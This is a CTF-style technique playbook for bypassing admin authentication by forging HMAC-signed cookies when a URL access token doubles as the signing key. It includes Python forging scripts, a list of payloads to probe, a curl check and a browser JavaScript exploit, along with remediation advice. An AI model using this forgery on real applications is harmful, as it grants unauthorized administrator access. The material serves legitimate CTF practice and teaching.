# Cookie HMAC Key Reuse → Admin Authentication Bypass

> When the server reuses a URL-exposed access token as the Cookie signing key, and the admin backend directly trusts claim fields in the Cookie payload, an attacker can forge an administrator identity.

---

## Applicable Scenarios

- The target is a web application whose URL path contains parameters such as `access_token` / `token` / `key`
- A signed Cookie is set in response headers (e.g. `student_gate=<payload>.<signature>`)
- Multiple signed Cookies (student-facing + admin-facing) may share the same key
- The admin Cookie payload contains client-controllable privilege claims (e.g. `{"admin":true}`)

## Keywords

- HMAC key reuse
- Known-key session forgery
- Client-side claims-based auth
- Cookie signature bypass

## Attack Flow

### Step 1: Extract the access token from the URL

The entry URL typically shows:

```
/access/blD4QO5On1O7G3M47ZxE4u93Qw4dr1ra
```

Extract the token:

```
blD4QO5On1O7G3M47ZxE4u93Qw4dr1ra
```

### Step 2: Observe the student_gate Cookie

Visiting the entry point sets a signed Cookie in the response headers. The format is usually:

```
Set-Cookie: <name>=<base64url(payload)>.<base64url(signature)>
```

Decode the payload to confirm its structure.

### Step 3: Verify the signing algorithm

Use the known access token as the HMAC key and try to reproduce the signature:

```python
import hmac, hashlib, base64

access_token = "token extracted from the URL"
payload_b64 = "payload part extracted from the Cookie"
expected_sig = "signature part extracted from the Cookie"

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

computed = b64url(hmac.new(
    access_token.encode(),
    payload_b64.encode(),
    hashlib.sha256
).digest())

print("match" if computed == expected_sig else "no match")
```

If it matches → confirms that `the access token IS the HMAC key`.

### Step 4: Guess the admin Cookie name and payload structure

Common admin Cookie names:

- `admin_session`
- `admin_token`
- `admin_auth`
- `manage_token`
- `backstage_session`

Payload structures to probe (try each until one returns 200):

```json
{"admin":true}
{"role":"admin"}
{"isAdmin":true}
{"access":"admin"}
{"level":"admin"}
{"user":"admin"}
{"authenticated":true}
{"type":"admin"}
```

### Step 5: Forge the admin Cookie

```python
import hmac, hashlib, json, base64

access_token = "the known token"
payload = {"admin": True}

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

payload_b64 = b64url(json.dumps(payload, separators=(",", ":")).encode())
sig = b64url(hmac.new(
    access_token.encode(), payload_b64.encode(), hashlib.sha256
).digest())

cookie = f"admin_session={payload_b64}.{sig}"
print(cookie)
```

### Step 6: Verify admin access

```bash
curl -k -H "Cookie: <cookie from the previous step>" https://target/api/admin/me
```

Success if the response is `{"admin":true}` or 200 with administrator data.

## Browser Reproduction

```javascript
async function exploit() {
  const token = location.pathname.split('/access/')[1];
  const enc = new TextEncoder();
  const key = await crypto.subtle.importKey('raw', enc.encode(token),
    { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
  const payload = btoa('{"admin":true}').replace(/=/g, '');
  const sig = await crypto.subtle.sign('HMAC', key, enc.encode(payload));
  const sigB64 = btoa(String.fromCharCode(...new Uint8Array(sig)))
    .replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
  document.cookie = `admin_session=${payload}.${sigB64}; path=/; Secure`;
  location.reload();
}
exploit();
```

## Remediation

1. Sign Cookies with a server-side independent key; do not share it with the URL token
2. Base admin privileges on server-side sessions, not on claims in the client-side Cookie payload
3. Use different signing keys for different roles
4. Include and validate claims such as `iat` / `exp` / `typ` in the Cookie
5. Silently handle signature parsing failures (return 401, not 500)

## Related Cases

- class.pangbaoba.me CTF range admin bypass (student_gate and admin_session shared the access token as the HMAC key; `{"admin":true}` granted administrator privileges directly)

## Related Skills

- `CTF-Sandbox/competition-web-runtime/SKILL.md` — Web runtime analysis
- `CTF-Sandbox/competition-jwt-claim-confusion/SKILL.md` — Similar token claim confusion
- `reverse-engineering/languages-platforms.md` — JWT / OAuth related
